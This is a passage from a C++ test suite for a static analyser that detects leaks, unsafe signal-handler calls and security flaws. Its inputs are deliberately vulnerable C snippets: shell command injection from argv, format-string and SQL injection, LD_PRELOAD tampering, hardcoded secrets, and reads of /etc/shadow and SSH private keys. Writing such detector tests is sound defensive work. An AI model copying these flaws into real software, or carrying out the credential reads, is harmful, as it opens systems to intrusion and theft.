    relock_all();
    mtx_.unlock();
}
void by_mode(struct ctx *c, int mode) {
    switch (mode) {
    case 0:
        pthread_mutex_lock(&c->mu);
        c->n++;
        pthread_mutex_unlock(&c->mu);
        break;
    default:
        c->n--;
        break;
    }
    switch (mode) {
    case 0:
        break;
    default:
        pthread_mutex_unlock(&c->mu);
    }
}
void flush(struct ctx *c, int locked) {
    if (!locked) {
        pthread_mutex_lock(&c->mu);
        c->n++;
        pthread_mutex_unlock(&c->mu);
    }
    if (locked)
        pthread_mutex_unlock(&c->mu);
}
void loop(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    while (c->busy) {
        pthread_mutex_unlock(&c->mu);
        work();
        pthread_mutex_lock(&c->mu);
        pthread_cond_wait(&c->cv, &c->mu);
    }
    pthread_mutex_unlock(&c->mu);
}
void caller_holds(struct ctx *c) {
    pthread_mutex_unlock(&c->mu);
    while (!c->ready)
        pthread_cond_wait(&c->cv, &c->mu);
}
)")),
             std::string(""));
}

TEST(thread_handles) {
    CHECK_EQ(found(code(R"(
void join_twice(void) {
    pthread_t t;
    pthread_create(&t, NULL, worker, NULL);
    pthread_join(t, NULL);
    pthread_join(t, NULL);
}
void detach_then_join(void) {
    pthread_t t;
    if (pthread_create(&t, NULL, worker, NULL) != 0)
        return;
    pthread_detach(t);
    pthread_join(t, NULL);
}
int never_joined(void) {
    pthread_t t;
    pthread_create(&t, NULL, worker, NULL);
    return 0;
}
void overwritten(void) {
    pthread_t t;
    pthread_create(&t, NULL, worker, NULL);
    pthread_create(&t, NULL, worker, NULL);
    pthread_join(t, NULL);
}
)")),
             std::string("double-join@5 double-join@12 resource-leak@17 "
                         "resource-leak@22"));
    // Joined, failed, maybe detached by its attributes, or handed on.
    CHECK_EQ(found(code(R"(
void joined(void) {
    pthread_t t;
    pthread_create(&t, NULL, worker, NULL);
    pthread_join(t, NULL);
}
void failed(void) {
    pthread_t t;
    int rc = pthread_create(&t, NULL, worker, NULL);
    if (rc)
        return;
    pthread_detach(t);
}
void if_failed(void) {
    pthread_t t;
    if (pthread_create(&t, NULL, worker, NULL)) {
        perror("pthread_create");
        return;
    }
    pthread_join(t, NULL);
}
void with_attr(pthread_attr_t *a) {
    pthread_t t;
    pthread_create(&t, a, worker, NULL);
}
void handed(void) {
    pthread_t t;
    pthread_create(&t, NULL, worker, NULL);
    wait_for(t);
}
void stored(struct pool *p) {
    pthread_t t;
    pthread_create(&t, NULL, worker, NULL);
    p->thread = t;
}
void in_array(pthread_t *ts, int n) {
    for (int i = 0; i < n; i++)
        pthread_create(&ts[i], NULL, worker, NULL);
}
void printed(void) {
    pthread_t t;
    pthread_create(&t, NULL, worker, NULL);
    pthread_join(t, NULL);
    printf("%lu\n", (unsigned long)t);
}
pthread_t returned(void) {
    pthread_t t;
    pthread_create(&t, NULL, worker, NULL);
    return t;
}
)")),
             std::string(""));
}

TEST(overwritten_on_a_later_iteration) {
    CHECK_EQ(found(code(R"(
void each_line(FILE *in) {
    char buf[64];
    char *last = NULL;
    while (fgets(buf, sizeof buf, in))
        last = strdup(buf);
    free(last);
}
void reopen(const char **paths, int n) {
    int fd = -1;
    for (int i = 0; i < n; i++)
        fd = open(paths[i], O_RDONLY);
    if (fd >= 0)
        close(fd);
}
void skipped_free(int n) {
    char *p;
    for (int i = 0; i < n; i++) {
        p = malloc(16);
        if (i % 2)
            continue;
        free(p);
    }
}
void threads(int n) {
    pthread_t t;
    for (int i = 0; i < n; i++)
        pthread_create(&t, NULL, worker, NULL);
    pthread_join(t, NULL);
}
void grow(int n) {
    char *p = NULL;
    for (int i = 0; i < n; i++)
        p = realloc(p, i + 1);
    free(p);
}
void copies(const char *s, int n) {
    char *p = strdup(s);
    for (int i = 0; i < n; i++)
        p = strdup(p);
    free(p);
}
)")),
             // skipped_free's block is live on one path only when the next
             // iteration overwrites it: reported where p goes out of scope.
             // grow: only the realloc-failure leak; realloc moves the block.
             std::string("memory-leak@5 resource-leak@11 memory-leak@23 "
                         "resource-leak@27 memory-leak@33 memory-leak@39"));
    // Released, handed on, or kept by another variable before the next one.
    CHECK_EQ(found(code(R"(
void freed_each_time(int n) {
    char *p;
    for (int i = 0; i < n; i++) {
        p = malloc(16);
        free(p);
    }
}
void chained(int n) {
    char *cur, *prev = NULL;
    for (int i = 0; i < n; i++) {
        cur = malloc(16);
        free(prev);
        prev = cur;
    }
    free(prev);
}
void lazy(int n) {
    char *p = NULL;
    for (int i = 0; i < n; i++) {
        if (!p)
            p = malloc(16);
        p[0] = 'x';
    }
    free(p);
}
void listed(struct list *l, FILE *in) {
    char buf[64];
    char *line;
    while (fgets(buf, sizeof buf, in)) {
        line = strdup(buf);
        list_push(l, line);
    }
}
)")),
             std::string(""));
}

// "call@line" for each unsafe call in an installed signal handler.
std::string unsafe_in_handlers(const std::string &src) {
    const auto toks = lex(src);
    std::string out;
    for (const Issue &i : signal_unsafe_calls(toks, parse_functions(toks)))
        out += (out.empty() ? "" : " ") +
               i.message.substr(0, i.message.find('(')) + "@" +
               std::to_string(i.line);
    return out;
}

TEST(signal_handlers) {
    const std::string src = code(R"(
static void on_int(int sig) {
    (void)sig;
    printf("bye\n");
}
static void on_term(int sig) {
    stop = 1;
}
static void on_fault(int sig, siginfo_t *si, void *ctx) {
    free(cache);
    std::exit(1);
}
static void helper(void) { printf("not a handler\n"); }
static void quiet(int sig) { stop = 1; if (log.free) {} pool.free(slot); }
int main(void) {
    signal(SIGINT, on_int);
    signal(SIGTERM, &on_term);
    signal(SIGPIPE, SIG_IGN);
    struct sigaction sa = {.sa_sigaction = on_fault};
    sa.sa_handler = quiet;
    helper();
}
)");
    CHECK_EQ(unsafe_in_handlers(src), std::string("printf@3 free@9 exit@10"));
    const auto toks = lex(src);
    const auto all = signal_unsafe_calls(toks, parse_functions(toks));
    CHECK(!all.empty() && all[0].alloc_line == 15 &&
          all[0].message.find("handler 'on_int' (installed at line 15)") !=
              std::string::npos);
    // Through a function of the same file: reported at the handler's call.
    const std::string via = code(R"(
static void log_line(const char *s) { fputs(s, stderr); }
static void on_hup(int sig) {
    reload = 1;
    log_line("reload\n");
}
static void on_usr1(int sig) { count++; note(); }
int main(void) {
    signal(SIGHUP, on_hup);
    signal(SIGUSR1, on_usr1);
    log_line("start\n");
}
)");
    CHECK_EQ(unsafe_in_handlers(via), std::string("fputs@4"));
    const auto vt = lex(via);
    const auto vi = signal_unsafe_calls(vt, parse_functions(vt));
    CHECK(vi.size() == 1 &&
          vi[0].message.find("through log_line()") != std::string::npos);
    // The call shares a line with '}', after a blank line. A line-range
    // lookup that stops one short drops it.
    CHECK_EQ(unsafe_in_handlers(code(R"(
static void on_alrm(int sig)

{
printf("tick"); }
int main(void) { signal(SIGALRM, on_alrm); }
)")),
             std::string("printf@4"));
}

TEST(unchecked_streams) {
    CHECK_EQ(found(code(R"(
void first_line(const char *path, char *buf) {
    FILE *f = fopen(path, "r");
    fgets(buf, 64, f);
    fclose(f);
}
void checked(const char *path, char *buf) {
    FILE *f = fopen(path, "r");
    if (!f)
        return;
    fgets(buf, 64, f);
    fclose(f);
}
void asserted(const char *path) {
    FILE *f = fopen(path, "w");
    GGML_ASSERT(f);
    fputs("x", f);
    fclose(f);
}
void in_condition(const char *path, char *buf) {
    FILE *f;
    if ((f = fopen(path, "r")) == NULL)
        return;
    while (fgets(buf, 64, f))
        puts(buf);
    fclose(f);
}
void dir(const char *path) {
    DIR *d = opendir(path);
    while (readdir(d))
        ;
    closedir(d);
}
void descriptor(const char *path, char *buf) {
    int fd = open(path, O_RDONLY);
    read(fd, buf, 4);
    close(fd);
}
void with_assert(const char *path) {
    FILE *f = fopen(path, "w");
    assert(f);
    fputs("x", f);
    fclose(f);
}
int short_circuit(const char *path, const char *data) {
    FILE *f = fopen(path, "w");
    int ok = f != NULL && fputs(data, f) >= 0;
    if (ok)
        fputs("\n", f);
    if (f)
        fclose(f);
    return ok;
}
)")),
             std::string("unchecked-stream@3 unchecked-stream@29"));
}

TEST(block_scopes) {
    CHECK_EQ(found(code(R"(
void shadow(const char *name) {
    FILE *f = fopen(name, "r");
    if (!f) return;
    {
        std::ifstream f(name);
        consume(f);
    }
    fclose(f);
}
void inner(int c) {
    if (c) {
        char *p = malloc(4);
        p[0] = 1;
    }
}
void kept(int c) {
    char *out = NULL;
    {
        char *p = malloc(4);
        out = p;
    }
    free(out);
}
void param(char *s) {
    {
        char *s = strdup("x");
        free(s);
    }
    free(s);
}
)")),
             // the inner block's own pointer dies at its brace
             std::string("memory-leak@14"));
}

TEST(minus_one_is_a_descriptors_null) {
    // fd is -1 or the descriptor, never an unknown value: closing it twice
    // is reported even though it was opened on one path only.
    CHECK_EQ(found(code(R"(
void f(int c) {
    int fd = -1;
    if (c)
        fd = open("x", O_RDONLY);
    close(fd);
    close(fd);
}
)")),
             std::string("double-close@6"));
}

TEST(cxx_open_members_are_not_descriptors) {
    CHECK_EQ(found(code(R"(
bool g(File &f, const char *p) {
    bool ok = f.open(p);
    int n = open(p);
    f.close();
    return ok && n;
}
)")),
             std::string(""));
}

// ---------------------------------------------------------------- security

// "rule@line" for each security finding.
std::string security(const std::string &src) {
    const auto toks = lex(src);
    std::string out;
    for (const Issue &i : security_issues(toks, parse_functions(toks)))
        out += (out.empty() ? "" : " ") + i.rule + "@" + std::to_string(i.line);
    return out;
}

std::string security_message(const std::string &src, const std::string &rule) {
    const auto toks = lex(src);
    for (const Issue &i : security_issues(toks, parse_functions(toks)))
        if (i.rule == rule)
            return i.message;
    return "";
}

TEST(security_sizeof_pointer_alloc_overflow_and_tls) {
    CHECK_EQ(security(code(R"(
void a(void) { char *p = malloc(100); memset(p, 0, sizeof(p)); }
void b(char *q) { memset(q, 0, sizeof q); }
void c(void) { char buf[64]; char *p = buf; memset(p, 0, sizeof(p)); }
void d(void) { char buf[64]; memset(buf, 0, sizeof buf); }
void e(void) { char *p = malloc(64); memset(p, 0, sizeof *p); }
void f(void) { int x; memset(&x, 0, sizeof(x)); }
)")),
             std::string("sizeof-pointer@1 sizeof-pointer@2 sizeof-pointer@3"));
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    int n = atoi(argv[1]);
    int *v = malloc(n * 4);
    free(v);
    char *ok1 = calloc(n, 4);
    free(ok1);
    char *ok2 = malloc(10 * 4);
    free(ok2);
    size_t m = strlen(argv[1]);
    char *ok3 = malloc(m + 1);
    free(ok3);
    return 0;
}
)")),
             std::string("alloc-size-overflow@3"));
    CHECK_EQ(security(code(R"(
void s(SSL_CTX *c) { SSL_CTX_set_verify(c, SSL_VERIFY_NONE, 0); }
void t(SSL_CTX *c) { SSL_CTX_set_verify(c, SSL_VERIFY_PEER, 0); }
void u(SSL *s) { SSL_set_verify(s, SSL_VERIFY_NONE, 0); }
)")),
             std::string("tls-no-verify@1 tls-no-verify@3"));
}

TEST(security_preload_assigned_by_the_program) {
    CHECK_EQ(security(code(R"(
void a(void) { putenv("LD_PRELOAD=/tmp/x.so"); }
void b(void) { setenv("DYLD_INSERT_LIBRARIES", "/tmp/x.dylib", 1); }
void c(void) { setenv("LD_PRELOAD", "/tmp/y.so", 1); }
void d(void) { char *p = getenv("LD_PRELOAD"); }
void e(const char *v) { setenv("LD_PRELOAD", v, 1); }
void f(void) { putenv("PATH=/tmp"); }
void g(void) { setenv("LD_PRELOAD", "", 1); }
)")),
             std::string("process-injection@1 process-injection@2 process-injection@3 "
                         "command-injection@6"));
}

TEST(security_format_strings) {
    const std::string src = code(R"(
void a(char *buf) { printf(buf); }
void b(char *buf) { printf("%s", buf); }
void c(FILE *f, const char *m) { fprintf(f, m); }
void d(void) { const char *fmt = "hi %d\n"; printf(fmt); }
void e(void) { printf(USAGE); }
int main(int argc, char **argv) { fprintf(stderr, argv[1]); return 0; }
void g(const char *m) { syslog(LOG_ERR, m); }
void h(char *b, const char *m) { snprintf(b, 10, m); }
void i(const char *m) { printf(m, 1); }
void j(void) { printf("a" "b"); }
void k(void) { printf(_("hello")); }
void l(void) { char s[8] = "x"; printf(s); }
void m(void) { const char *f2 = "a"; f2 = pick(); printf(f2); }
)");
    CHECK_EQ(security(src),
             std::string("format-string@1 format-string@3 format-string@6 "
                         "format-string@7 format-string@8 format-string@13"));
    // the one from argv is said to come from outside, the others are not
    CHECK(security_message(src, "format-string").find("comes from outside") ==
          std::string::npos);
    CHECK(security(code(R"(
int main(int argc, char **argv) { printf(argv[1]); }
)")) == "format-string@1");
    CHECK(security_message(code(R"(
int main(int argc, char **argv) { printf(argv[1]); }
)"), "format-string").find("comes from outside") != std::string::npos);
    // with arguments after it, only a format from outside is a problem
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    char *format = argv[1];
    printf(format, argv[2]);
}
void again(char **argv) {
    char *format = argv[1];
    printf(format);
    printf(format);
}
void ok(const char *fmt, int n) { printf(fmt, n); }
void log_it(char *fmt) { fprintf(stderr, fmt, 1); }
)")),
             // (the second printf(format) of again() is the same finding)
             std::string("format-string@3 format-string@7"));
}

TEST(security_commands_and_copies_made_from_outside_text) {
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    char cmd[128];
    snprintf(cmd, sizeof cmd, "ls %s", argv[1]);
    system(cmd);
    char name[16];
    strcpy(name, argv[1]);
    char tiny[4];
    strcpy(tiny, "too long");
    char ok[16];
    strcpy(ok, "fits");
    char *home = getenv("HOME");
    char path[64];
    sprintf(path, "%s/x", home);
    sprintf(path, "%.20s", home);
    system("ls /tmp");
    int n = atoi(argv[2]);
    char num[32];
    sprintf(num, "%d", n);
    return 0;
}
void fixed(const char *s) {
    char b[8];
    strcpy(b, s);
}
void line_in(FILE *f) {
    char line[100];
    char big[10];
    fgets(line, sizeof line, f);
    strcpy(big, line);
    popen(line, "r");
}
void shell_c(char **argv) {
    execl("/bin/sh", "sh", "-c", argv[1], (char *)0);
    execl("/bin/ls", "ls", "-l", argv[1], (char *)0);
}
void sized(char **argv) {
    char buf[8];
    sprintf(buf, "0123456789");
    sprintf(buf, "%d", 5);
}
)")),
             std::string("command-injection@4 unbounded-copy@6 unbounded-copy@8 "
                         "unbounded-copy@13 unbounded-copy@29 command-injection@30 "
                         "command-injection@33 unbounded-copy@38"));
}

TEST(security_unsafe_functions) {
    CHECK_EQ(security(code(R"(
void a(char *b) { gets(b); }
void b(void) { char *t = mktemp(tpl); }
void c(void) { char *t = tmpnam(NULL); }
void d(char *w) { scanf("%s", w); }
void e(char *w) { scanf("%9s", w); }
void f(char *w) { scanf("%*s %d", &n); }
void g(char *s) { char w[8]; sscanf(s, "%[a-z]", w); }
void h(char *w) { getwd(w); }
void i(char *w) { fscanf(in, "%s", w); }
void j(char *w) { scanf("%d", &n); }
void k(char *s, char *w) { sscanf(s, "%s", w); }
void l(void) { char line[16]; char word[32]; fgets(line, 16, in); sscanf(line, "%s", word); }
void m(void) { char line[64]; char word[16]; fgets(line, 64, in); sscanf(line, "%s", word); }
)")),
             // k: the destination's size is not known; l: a word cannot be longer than
             // the line it comes from, and the array is bigger than the line
             std::string("unsafe-function@1 unsafe-function@2 unsafe-function@3 "
                         "unsafe-function@4 unsafe-function@7 unsafe-function@8 "
                         "unsafe-function@9 unsafe-function@13"));
    // Blank line, static on its own line, brace on the next: the body is
    // still this function.
    CHECK_EQ(security(code(R"(
void ok(void) { return; }

static
void split(char *b)
{
    gets(b);
}
)")),
             std::string("unsafe-function@6"));
}

TEST(security_secrets_written_into_the_program) {
    CHECK_EQ(security(code(R"(
static const char *password = "hunter2";
const char *api_token = "abc12345";
static const char *password_prompt = "Password: ";
int token_count = 5;
void check(const char *password) {
    if (strcmp(password, "letmein") == 0)
        grant();
}
void cfg(struct conf *c) { c->secret = "s3cr3t-value"; }
const char *key = "-----BEGIN RSA PRIVATE KEY-----";
const char *aws = "AKIAIOSFODNN7EXAMPLE";
const char *msg_password = "Enter your password";
const char *password_file = "/etc/pw";
void ok(void) { if (strcmp(user, "admin") == 0) {} }
char token[] = "Zx81Qp0LmN4vTq9aB7";
const char *tokenizer = "bpe-model";
void parse(void) { if (strcmp(token[0], "SAMPLE_PERIOD") == 0) {} }
static struct arg a = { .name = "reduce", .token = "REDUCE" };
)")),
             std::string("hardcoded-secret@1 hardcoded-secret@2 hardcoded-secret@6 "
                         "hardcoded-secret@9 hardcoded-secret@10 hardcoded-secret@11 "
                         "hardcoded-secret@15"));
}

TEST(security_check_then_use_permissions_and_algorithms) {
    CHECK_EQ(security(code(R"(
void a(const char *p) {
    if (access(p, R_OK) == 0) {
        FILE *f = fopen(p, "r");
        fclose(f);
    }
}
void b(const char *p) { FILE *f = fopen(p, "r"); fclose(f); }
void c(const char *p, const char *q) {
    access(p, W_OK);
    unlink(q);
}
void d(const char *p) { chmod(p, 0777); }
void e(const char *p) { chmod(p, 0644); }
void f(int fd) { fchmod(fd, S_IRWXU | S_IRWXO); }
void g(void) { umask(0); umask(022); }
void h(void) { MD5(a, b, c); SHA256(a, b, c); }
void i(const char *p) { chmod(p, 0666); }
)")),
             std::string("toctou-race@3 insecure-permissions@12 "
                         "insecure-permissions@14 insecure-permissions@15 "
                         "weak-crypto@16 insecure-permissions@17"));
}

TEST(security_alloca_of_a_size_from_outside) {
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    char *p = alloca(strlen(argv[1]) + 1);
    char *q = alloca(64);
    char buf[32];
    char *r = alloca(sizeof buf);
    int n = 16;
    char *s = alloca(n);
    char *t = __builtin_alloca(sizeof(buf));
    return 0;
}
)")),
             std::string("unbounded-alloca@2"));
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    size_t n = strtoul(argv[1], 0, 10);
    char *p = alloca(n);
    return 0;
}
)")),
             std::string("unbounded-alloca@3"));
    // assigned back to a constant: the size is not from outside any more
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    size_t n = strtoul(argv[1], 0, 10);
    n = 8;
    char *p = alloca(n);
    return 0;
}
)")),
             std::string(""));
    CHECK_EQ(security(code(R"(
void copy_in(const char *s) {
    char *p = alloca(strlen(s) + 1);
}
int main(int argc, char **argv) {
    copy_in(argv[1]);
    return 0;
}
)")),
             std::string("unbounded-alloca@2"));
    CHECK_EQ(security(code(R"(
void pad(size_t n) { char *p = alloca(n); }
int main(void) { pad(64); return 0; }
)")),
             std::string(""));
}

TEST(security_certificate_check_turned_off) {
    CHECK_EQ(security(code(R"(
void bad(void *c) { curl_easy_setopt(c, CURLOPT_SSL_VERIFYPEER, 0); }
void host(void *c) { curl_easy_setopt(c, CURLOPT_SSL_VERIFYHOST, 0); }
void ok(void *c) { curl_easy_setopt(c, CURLOPT_SSL_VERIFYPEER, 1); }
void host_ok(void *c) { curl_easy_setopt(c, CURLOPT_SSL_VERIFYHOST, 2); }
)")),
             std::string("tls-no-verify@1 tls-no-verify@2"));
}

TEST(security_canonicalize_of_a_joined_path) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) {
    char *path = malloc(128);
    snprintf(path, 128, "/data/%s", argv[1]);
    canonicalize_file_name(path);
    free(path);
}
void full(char **argv) {
    char *path = malloc(128);
    snprintf(path, 128, "/data/%s", argv[1]);
    realpath(path, 0);
    free(path);
}
void ok(char **argv) { canonicalize_file_name(argv[1]); }
)")),
             std::string("path-traversal@4 path-traversal@10"));
}

TEST(security_path_joined_from_outside_text) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) {
    char *path = malloc(128);
    snprintf(path, 128, "/data/%s", argv[1]);
    fopen(path, "r");
    free(path);
}
void ok(char **argv) {
    char *path = malloc(128);
    if (strstr(argv[1], ".."))
        return;
    snprintf(path, 128, "/data/%s", argv[1]);
    fopen(path, "r");
    free(path);
}
void plain(char **argv) { fopen(argv[1], "r"); }
void appended(char **argv) {
    std::string path = "/data";
    path += "/";
    path += argv[1];
    fopen(path.c_str(), "r");
}
void at(int d, char **argv) {
    char *path = malloc(128);
    snprintf(path, 128, "/data/%s", argv[1]);
    openat(d, path, O_RDONLY);
    free(path);
}
)")),
             std::string("path-traversal@4 path-traversal@20 path-traversal@25"));
}

TEST(security_parameterized_query_of_a_tainted_query_text) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) { PQexecParams(c, argv[1], 0, 0, 0, 0, 0, 0); }
void ok(char **argv) { PQexecParams(c, "SELECT $1", 1, 0, argv + 1, 0, 0, 0); }
)")),
             std::string("sql-injection@1"));
}

TEST(security_sqlite_prepare_v3_of_outside_text) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) { sqlite3_prepare_v3(db, argv[1], -1, 0, &st, 0); }
void stmt(char **argv) { mysql_stmt_prepare(st, argv[1], 0); }
void ok(void) { sqlite3_prepare_v3(db, "SELECT 1", -1, 0, &st, 0); }
)")),
             std::string("sql-injection@1 sql-injection@2"));
}

TEST(security_sql_injection) {
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    sqlite3_exec(db, argv[1], 0, 0, 0);
    sqlite3_exec(db, "SELECT 1;", 0, 0, 0);
    char query[256];
    snprintf(query, sizeof(query), "SELECT * FROM users WHERE name = '%s'", argv[1]);
    mysql_query(conn, argv[1]);
    PQexec(conn, argv[1]);
    return 0;
}
)")),
             std::string("sql-injection@2 sql-injection@5 sql-injection@6 sql-injection@7"));
}

TEST(security_null_pointer_dereference) {
    CHECK_EQ(security(code(R"(
void bad1(void) {
    char *p = NULL;
    *p = 'a';
}
void bad2(void) {
    struct node *n = nullptr;
    n->val = 1;
}
void bad3(void) {
    int *arr = 0;
    arr[0] = 5;
}
void bad4(char *p) {
    if (!p) {
        *p = 'x';
    }
}
void bad5(struct node *p) {
    if (p == NULL) {
        p->next = NULL;
    }
}
void ok1(void) {
    char *p = malloc(10);
    if (!p) return;
    *p = 'a';
    free(p);
}
)")),
             std::string("null-dereference@3 null-dereference@7 null-dereference@11 null-dereference@15 null-dereference@20"));
}

TEST(security_capset_changes_capabilities) {
    CHECK_EQ(security(code(R"(
void bad(void *h, void *d) { capset(h, d); }
void raise(void) { prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, 10, 0, 0); }
void lower(void) { prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_LOWER, 10, 0, 0); }
void named(void) { prctl(PR_SET_NAME, "worker"); }
)")),
             std::string("privilege-escalation@1 privilege-escalation@2"));
}

TEST(security_iopl_asks_for_ports) {
    CHECK_EQ(security(code(R"(
void bad(void) { iopl(3); }
void ports(void) { ioperm(0x3f8, 8, 1); }
void off(void) { iopl(0); }
void drop(void) { ioperm(0x3f8, 8, 0); }
)")),
             std::string("privilege-escalation@1 privilege-escalation@2"));
}

TEST(security_syslog_of_a_password) {
    CHECK_EQ(security(code(R"(
void bad(const char *password) { syslog(LOG_INFO, "pw %s", password); }
void asfmt(const char *password) { syslog(LOG_INFO, password); }
void ok(const char *password) { syslog(LOG_INFO, "started"); }
void user(const char *name) { syslog(LOG_INFO, "user %s", name); }
void e(const char *password) { err(1, "pw %s", password); }
void w(const char *password) { warn("%s", password); }
)")),
             std::string("credential-access@1 format-string@2 credential-access@2 "
                         "credential-access@5 credential-access@6"));
}

TEST(security_path_set_to_a_writable_directory) {
    CHECK_EQ(security(code(R"(
void bad(void) { setenv("PATH", "/tmp", 1); }
void rel(void) { setenv("PATH", ".", 1); }
void env(char **argv) { setenv("PATH", argv[1], 1); }
void put(void) { putenv("PATH=/tmp/bin"); }
void ok(void) { setenv("PATH", "/usr/bin", 1); }
void cleared(void) { unsetenv("PATH"); }
)")),
             std::string("command-injection@1 command-injection@2 command-injection@3 "
                         "command-injection@4 command-injection@6"));
}

TEST(security_library_path_set_to_a_writable_directory) {
    CHECK_EQ(security(code(R"(
void bad(void) { setenv("LD_LIBRARY_PATH", "/tmp", 1); }
void dyld(void) { setenv("DYLD_LIBRARY_PATH", "/tmp", 1); }
void env(char **argv) { setenv("LD_LIBRARY_PATH", argv[1], 1); }
void ok(void) { setenv("LD_LIBRARY_PATH", "/usr/lib", 1); }
)")),
             std::string("process-injection@1 process-injection@2 process-injection@3"));
}

TEST(security_execve_of_a_shell_array) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) { execve("/bin/sh", (char *[]){"sh", "-c", argv[1], 0}, 0); }
void vp(char **argv) { execvp("sh", (char *[]){"sh", "-c", argv[1], 0}); }
void ok(char **argv) { execve("/bin/ls", (char *[]){"ls", argv[1], 0}, 0); }
void fixed(void) { execve("/bin/sh", (char *[]){"sh", "-c", "ls", 0}, 0); }
)")),
             std::string("command-injection@1 command-injection@2"));
}

TEST(security_posix_spawn_of_a_shell) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) { posix_spawn(&pid, "/bin/sh", 0, 0, (char *[]){"sh", "-c", argv[1], 0}, 0); }
void path(char **argv) { posix_spawnp(&pid, "sh", 0, 0, (char *[]){"sh", "-c", argv[1], 0}, 0); }
void ok(void) { posix_spawn(&pid, "/bin/ls", 0, 0, (char *[]){"ls", "-l", 0}, 0); }
void fixed(void) { posix_spawn(&pid, "/bin/sh", 0, 0, (char *[]){"sh", "-c", "ls", 0}, 0); }
)")),
             std::string("command-injection@1 command-injection@2"));
}

TEST(security_other_tls_libraries_skip_verify) {
    CHECK_EQ(security(code(R"(
void wolf(void *ctx) { wolfSSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, 0); }
void mb(void *c) { mbedtls_ssl_conf_authmode(c, MBEDTLS_SSL_VERIFY_NONE); }
void gnu(void *c) { gnutls_certificate_set_verify_flags(c, GNUTLS_VERIFY_DISABLE_CA_SIGN); }
void ok(void *ctx) { wolfSSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, 0); }
)")),
             std::string("tls-no-verify@1 tls-no-verify@2 tls-no-verify@3"));
}

TEST(security_ssl_password_callback_is_hardcoded) {
    CHECK_EQ(security(code(R"(
void bad(void *ctx) { SSL_CTX_set_default_passwd_cb_userdata(ctx, "s3cret"); }
void ok(void *ctx, char *pw) { SSL_CTX_set_default_passwd_cb_userdata(ctx, pw); }
)")),
             std::string("hardcoded-secret@1"));
}

TEST(security_pem_password_is_hardcoded) {
    CHECK_EQ(security(code(R"(
void bad(void *bio) { PEM_read_bio_PrivateKey(bio, 0, 0, "s3cret"); }
void file(void *fp) { PEM_read_PrivateKey(fp, 0, 0, "s3cret"); }
void ok(void *bio, char *pw) { PEM_read_bio_PrivateKey(bio, 0, 0, pw); }
)")),
             std::string("hardcoded-secret@1 hardcoded-secret@2"));
}

TEST(security_bytes_to_key_is_weak) {
    CHECK_EQ(security(code(R"(
void bad(void) { EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha256(), salt, pw, n, 1, key, iv); }
void ok(void) { PKCS5_PBKDF2_HMAC(pw, n, salt, ns, 100000, EVP_sha256(), 32, out); }
)")),
             std::string("weak-crypto@1"));
}

TEST(security_short_dh_prime) {
    CHECK_EQ(security(code(R"(
void bad(void *dh) { DH_generate_parameters_ex(dh, 1024, 2, 0); }
void dsa(void *d) { DSA_generate_parameters_ex(d, 1024, 0, 0, 0, 0, 0); }
void ctx(void *c) { EVP_PKEY_CTX_set_dsa_paramgen_bits(c, 1024); }
void ok(void *dh) { DH_generate_parameters_ex(dh, 2048, 2, 0); }
)")),
             std::string("weak-crypto@1 weak-crypto@2 weak-crypto@3"));
}

TEST(security_weak_elliptic_curve) {
    CHECK_EQ(security(code(R"(
void bad(void) { EC_KEY_new_by_curve_name(NID_secp112r1); }
void k(void) { EC_KEY_new_by_curve_name(NID_sect163k1); }
void ctx(void *c) { EVP_PKEY_CTX_set_ec_paramgen_curve_nid(c, NID_secp160r1); }
void ok(void) { EC_KEY_new_by_curve_name(NID_X9_62_prime256v1); }
void x(void) { EC_KEY_new_by_curve_name(NID_X25519); }
)")),
             std::string("weak-crypto@1 weak-crypto@2 weak-crypto@3"));
}

TEST(security_short_rsa_key) {
    CHECK_EQ(security(code(R"(
void bad(void) { RSA_generate_key(512, 65537, 0, 0); }
void ex(void *r) { RSA_generate_key_ex(r, 1024, e, 0); }
void ctx(void *c) { EVP_PKEY_CTX_set_rsa_keygen_bits(c, 1024); }
void ok(void *c) { EVP_PKEY_CTX_set_rsa_keygen_bits(c, 2048); }
void bigger(void) { RSA_generate_key(4096, 65537, 0, 0); }
)")),
             std::string("weak-crypto@1 weak-crypto@2 weak-crypto@3"));
}

TEST(security_more_predictable_generators) {
    CHECK_EQ(security(code(R"(
void gen(void) {
    int token = jrand48(x);
    int nonce = nrand48(x);
    int session_id = rand_r(&seed);
    int salt = erand48(x);
    int normal_val = jrand48(x);
}
void pseudo(void) { RAND_pseudo_bytes(buf, 16); }
void bn(void) { BN_pseudo_rand(n, 128, 0, 0); }
void ok(void) { RAND_bytes(buf, 16); }
void bnok(void) { BN_rand(n, 128, 0, 0); }
)")),
             std::string("insecure-prng@2 insecure-prng@3 insecure-prng@4 "
                         "insecure-prng@5 weak-crypto@8 weak-crypto@9"));
}

TEST(security_literal_secret_path) {
    CHECK_EQ(security(code(R"(
void bad(void) { open("/etc/shadow", O_RDONLY); }
void key(void) { open("/home/a/.ssh/id_rsa", O_RDONLY); }
void pre(void) { fopen("/etc/ld.so.preload", "w"); }
void mine(void) { printf("stratum+tcp://pool.example:3333"); }
void ok(void) { open("/etc/passwd", O_RDONLY); }
)")),
             std::string("credential-access@1 credential-access@2 persistence@3 "
                         "cryptominer@4"));
}

TEST(security_insecure_prng) {
    CHECK_EQ(security(code(R"(
void gen(void) {
    int token = rand();
    int secret_key = random();
    int nonce = drand48();
    int normal_val = rand();
}
)")),
             std::string("insecure-prng@2 insecure-prng@3 insecure-prng@4"));
}

TEST(security_mkdir_of_a_system_directory) {
    CHECK_EQ(security(code(R"(
void bad(void) { mkdir("/usr/bin/extra", 0755); }
void at(int d) { mkdirat(d, "/lib/extra", 0755); }
